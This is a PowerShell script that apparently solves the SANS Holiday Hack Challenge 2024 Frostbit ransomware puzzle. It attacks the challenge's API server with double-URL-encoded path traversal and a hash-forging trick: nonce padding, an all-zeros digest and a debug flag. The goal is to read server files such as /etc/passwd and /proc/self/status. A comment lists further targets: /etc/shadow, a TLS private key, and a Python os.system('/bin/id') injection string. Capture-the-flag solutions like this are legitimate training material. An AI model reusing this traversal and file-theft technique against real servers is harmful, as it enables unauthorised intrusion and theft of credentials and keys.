<#
    .SYNOPSIS

        Holiday Hack Challenge 2024 - Snow-maggedon
        
        Decrypt the Naughty-Nice List
        Difficulty: 5 of 5

        Author: Nick DeBaggis
        License: BSD 3-Clause
        Required Dependencies: Powershell 7
        Optional Dependencies: None

    .DESCRIPTION

        This script exfiltrates data from the Frostbit Ransomware API server.
        You will need three items to run this script, two can be found in both the decrypted TLS pcap
        as well as in the frostbit_core_dump file: the botuuid and the nonce.
        The third parameter is the file path to exfiltrate.  This script utilizes pre-padding
        prior to our <doubled-nonce><filename> attack to ensure the <doubled-nonce> lands at the
        same starting offset as the count modulus inside the _compute_hash function's second for loop
        of FrostBiteHashlib.py.

    .PARAMETER BotUUID

        Required Bot UUID, this is unique to each player and set of generated artifacts.
        You can find this UUID in both the frostbit_core_dump file strings as well as the
        pcap file provided you have decrypted the TLS HTTP traffic stream.
        
        The BotUUID will have this format of hex chars and dashes (example only):
        f14d60cd-67b9-44ec-8f41-b5ea5137413c

    .PARAMETER NonceHex

        Required nonce as a hex string, You can find the nonce in both the frostbit_core_dump file strings as well as the
        pcap file provided you have decrypted the TLS HTTP traffic stream.  It is located in a json object named "nonce".

    .PARAMETER FileToExfiltrate

        Required attempt exfiltration of file from the api server.

    .EXAMPLE

        .\14-frostbit-decrypt-exfiltrate.ps1 `
        -BotUUID f14d60cd-67b9-44ec-8f41-b5ea5137413c `
        -Nonce c97b647f99cb744a `
        -FileToExfiltrate "/../../../../../etc/passwd"

    .EXAMPLE

        .\14-frostbit-decrypt-exfiltrate.ps1 `
        -BotUUID f14d60cd-67b9-44ec-8f41-b5ea5137413c `
        -Nonce c97b647f99cb744a `
        -FileToExfiltrate "/../../../../../proc/self/status"

    .LINK
        https://www.sans.org/mlp/holiday-hack-challenge-2024/


#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)]
    [String]$BotUUID,

    [Parameter(Mandatory=$true)]
    [String]$NonceHex,

    [Parameter(Mandatory=$true)]
    [String]$FileToExfiltrate
)

function Is-UUID {
    param (
        [string]$InputString
    )
    
    $uuidRegex = '^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[1-5][0-9a-fA-F]{3}-[89abAB][0-9a-fA-F]{3}-[0-9a-fA-F]{12}$'
    return $InputString -match $uuidRegex
}

function Escape-StringForURL {
    param (
        [string]$inputString
    )

    # Hashtable for character to double URL encoding mapping
    $charMap = @{
        "/"  = "%252F"
        ";"  = "%253B"
        " "  = "%252B"
        "&"  = "%2526"
        "'"  = "%2527"
        "~"  = "%257E"
        "`""  = "%2522"
        "``"  = "%2560"
    }
    # Loop through each key-value pair in the hashtable and perform the replacement
    foreach ($key in $charMap.Keys) {
        $inputString = $inputString -replace [Regex]::Escape($key), $charMap[$key]
    }

    return $inputString
}

if(-not (Is-UUID -InputString $BotUUID)){
    "Error badly formatted BotUUID, you can find yours in the decrypted TLS HTTP pcap data and the frostbit_core_dump file."
    return
}

$nonceregex = '^[0-9a-fA-F]{16}$'
if($NonceHex -notmatch $nonceregex){
    "Error badly formatted Nonce, you can find yours in the decrypted TLS HTTP pcap data and the frostbit_core_dump file."
    return
}

$DoubleNonce = "$NonceHex$NonceHex"
$DoubleNonceEncoded = ""

for ($i = 0; $i -lt $DoubleNonce.Length; $i += 2) {
    $hexByte = $DoubleNonce.Substring($i, 2)
    $byte = [System.Convert]::ToByte($hexByte, 16)
    $DoubleNonceEncoded += "%25" + [System.BitConverter]::ToString($byte).Replace("-", "").ToLower()
}

<#
Files known to exist on the api server.
/etc/passwd
/etc/resolv.conf
/etc/nginx/certs/api.frostbit.app.key

__import__('os').system('/bin/id') ???
/etc/shadow ???
#>

$found = $false

0..15 | % {

    # base url
    $url = "https://api.frostbit.app/view/"
    
    $Padding = 'A' * $_
    
    $url += $Padding
    
    # double encoded nonce.
    $url += $DoubleNonceEncoded
    
    # api server local file to attempt reading.
    $url += Escape-StringForURL -inputString $FileToExfiltrate
    
    # botuuid, with all-zeros digest and debug set.
    $url += "/$BotUUID/status?digest=00000000000000000000000000000000&debug=true"
    
    # send the url and grab the response content
    $resp = Invoke-WebRequest -SkipHttpErrorCheck -Uri $url
    
    if($resp.StatusCode -eq 200){
        $found = $true
        "URI: " + $url
        $debugDataB64 = $($resp.Content | select-string -pattern "debugData = `"(.*)`"" | %{ $_.Matches[0].Groups[1].Value })
        
        $exfil = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($debugDataB64))
        $filelen = ($exfil | Format-Hex).Bytes.Length
        "Status code:      " + $resp.StatusCode
        "Filename:         " + $FileToExfiltrate
        "Padding length:   " + $Padding.Length
        "Filename length:  " + $FileToExfiltrate.Length
        "File length:      " + $filelen
        "File hexdump:"
        $exfil | Format-Hex
        "`nFile text: `n" + ($exfil -replace [char]0x0, " ")
    }
    if($found -eq $true){
        break
    }
}

if($found -eq $false){
    "URI: " + $url
    "Status code:         " + $resp.StatusCode + " " + $resp.StatusDescription
    "File not found:      " + $FileToExfiltrate
    $resp.Content
}
